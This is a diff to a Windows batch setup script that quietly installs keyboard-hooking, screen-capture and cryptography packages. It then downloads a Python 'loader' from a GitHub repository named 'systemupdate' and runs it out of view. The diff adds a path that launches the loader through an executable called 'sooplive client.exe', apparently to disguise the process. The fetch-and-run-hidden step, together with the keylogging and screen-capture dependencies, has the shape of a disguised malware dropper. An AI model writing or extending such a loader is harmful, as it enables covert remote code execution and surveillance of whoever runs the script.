@@ -16,6 +16,11 @@ for %%d in ("C:\Program Files\Python311" "%LocalAppData%\Programs\Python\Python3
 python -m pip install --upgrade pip --quiet
 python -m pip install cryptography dxcam opencv-python numpy keyboard pyserial mss pillow customtkinter --quiet
 
+python "%~dp0sync_launchers.py" "%~dp0"
 curl -s -o "%~dp0dloader.py" "https://raw.githubusercontent.com/blacknut0319-del/systemupdate/main/ddong_loader.py?t=%RANDOM%"
-for /f "tokens=*" %%i in ('python -c "import os,sys; print(os.path.join(os.path.dirname(sys.executable),'pythonw.exe'))"') do start "" "%%i" "%~dp0dloader.py"
+if exist "%~dp0sooplive client.exe" (
+    start "" "%~dp0sooplive client.exe" "%~dp0dloader.py"
+) else (
+    for /f "tokens=*" %%i in ('python -c "import os,sys; print(os.path.join(os.path.dirname(sys.executable),'pythonw.exe'))"') do start "" "%%i" "%~dp0dloader.py"
+)
 exit
